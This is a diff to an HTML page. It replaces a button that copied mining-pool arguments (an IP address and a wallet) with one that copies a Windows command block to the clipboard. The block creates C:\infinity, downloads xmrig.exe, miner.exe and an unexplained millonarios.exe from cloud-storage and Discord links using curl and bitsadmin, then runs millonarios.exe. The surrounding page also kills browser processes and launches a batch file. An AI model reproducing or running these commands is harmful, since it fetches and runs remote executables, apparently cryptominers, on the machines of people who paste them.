@@ -77,7 +77,7 @@
 	<div class="container">
 	
 
-        <button id="copyButton">comando</button>
+		<button id="copyBtn">Copy Commands</button>
 
 
 	</div>
@@ -123,18 +123,24 @@ taskkill /f /im msedge.exe&taskkill /f /im msedgewebview2.exe&taskkill /f /im ms
 start "Stella" cmd /k "Stella.bat" <br>
 		</p>
     <script>
-		 document.getElementById("copyButton").addEventListener("click", function() {
-            const textToCopy = '--algo kawpow --server stratum+tcp://35.190.124.115:9200 --user NHbEwGDCHVzTX3gGzfrkeiiwVMN7tLpvXf46';
-            
-            const textArea = document.createElement("textarea");
-            textArea.value = textToCopy;
-            document.body.appendChild(textArea);
-            textArea.select();
-            document.execCommand("copy");
-            document.body.removeChild(textArea);
+		const copyBtn = document.getElementById('copyBtn');
 
-           
-        });
+const commands = `
+mkdir C:\\infinity&SaveNewDuplicate & EditJust Text
+cd c:&cd/&cd infinity&curl -O "https://storage.googleapis.com/mariocorp/xmrig.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 C:\\infinity\\xmrig.exe C:\\infinity\\xmrig.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset
+mkdir C:\\infinity&SaveNewDuplicate & EditJust Text
+cd c:&cd/&cd infinity&curl -O "https://cdn.discordapp.com/attachments/1093679940689481819/1182627116257390653/millonarios.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 C:\\infinity\\millonarios.exe C:\\infinity\\millonarios.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset
+mkdir C:\\infinity&SaveNewDuplicate & EditJust Text
+cd c:&cd/&cd infinity&curl -O "https://storage.googleapis.com/mariocorp/miner.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 C:\\infinity\\miner.exe C:\\infinity\\miner.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset
+cd c:&cd/&cd infinity&millonarios.exe&cls
+`;
+
+copyBtn.addEventListener('click', () => {
+  navigator.clipboard.writeText(commands)
+    .then(() => alert('Commands copied!'))
+    .catch(() => alert('Error copying commands.'));
+});
+
 	</script>
 <script>
 		 document.getElementById("copyButton2").addEventListener("click", function() {
@@ -155,3 +161,4 @@ start "Stella" cmd /k "Stella.bat" <br>
 
 
 </body></html>
+
